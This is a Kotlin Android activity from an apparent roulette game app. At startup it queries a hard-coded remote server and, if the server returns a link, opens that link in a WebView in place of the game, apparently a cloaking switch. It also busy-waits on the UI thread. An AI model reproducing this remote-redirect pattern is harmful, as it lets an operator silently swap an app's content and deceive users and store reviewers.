package ru.easfa.test_roulette.activity

import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import ru.easfa.test_roulette.databinding.ActivityMainBinding
import java.io.BufferedReader
import java.io.InputStream
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL

class MainActivity : AppCompatActivity() {

    var urlStat: Boolean? = null
    var LAUNCH_ACTIV_FIRST: Int = 1
    var LAUNCH_ACTIV_SECOND: Int = 2
    private lateinit var binding: ActivityMainBinding
    private var BASE_URL: String = "https://werelems.ru/np8tX6Ym"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val research = fetchData()
        research.start()
        do {
            urlStat = research.getUrlCheked()
            if (urlStat == false) {
                binding = ActivityMainBinding.inflate(layoutInflater)
                setContentView(binding.root)
                binding.startButton.setOnClickListener {
                    buttonAction()
                }
            } else {
                if (urlStat == true) {
                    BASE_URL = research.getContentUrl().toString()
                    openWebView()
                }
            }
        } while (urlStat == null)
    }

    class fetchData : Thread() {
        private var urlStat: Boolean? = null
        private var contentUrl: String? = null

        override fun run() {
            try {
                val baseURL: URL = URL("https://werelems.ru/np8tX6Ym")
                val httpURLCon: HttpURLConnection = baseURL.openConnection() as HttpURLConnection
                val inputStram: InputStream = httpURLCon.inputStream
                val buffRead: BufferedReader = BufferedReader(InputStreamReader(inputStram))
                val strLink: String? = buffRead.readLine()?.toString()

                if(strLink == null) {
                    urlStat = false
                    contentUrl = ""
                } else {
                    urlStat = true
                    contentUrl = strLink
                }
            } catch (mal: NullPointerException) {
                mal.printStackTrace()
            } catch (ma: Exception) {
                ma.printStackTrace()
            }
        }

        fun getUrlCheked(): Boolean? {
            return urlStat
        }

        fun getContentUrl(): String? {
            return contentUrl
        }
    }

    private fun buttonAction() {
        val i =  Intent(this@MainActivity, RouletteActivity::class.java)
        startActivityForResult(i, LAUNCH_ACTIV_FIRST)
    }

    private fun openWebView() {
        val i =  Intent(this@MainActivity, WebViewActivity::class.java)
        i.putExtra(WebViewActivity.URL_Link, BASE_URL)
        startActivityForResult(i, LAUNCH_ACTIV_SECOND)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        if ((requestCode == LAUNCH_ACTIV_FIRST) || (requestCode == LAUNCH_ACTIV_SECOND)) {
            if(resultCode == RESULT_OK) {
                val firstKey = data?.getStringExtra("FIRST_KEY")
                // val firstKey = data?.getStringExtra("FIRST_KEY")
                // val secondKey = data?.getStringExtra("SCD_KEY")
                finish()
            }
        }
    }
}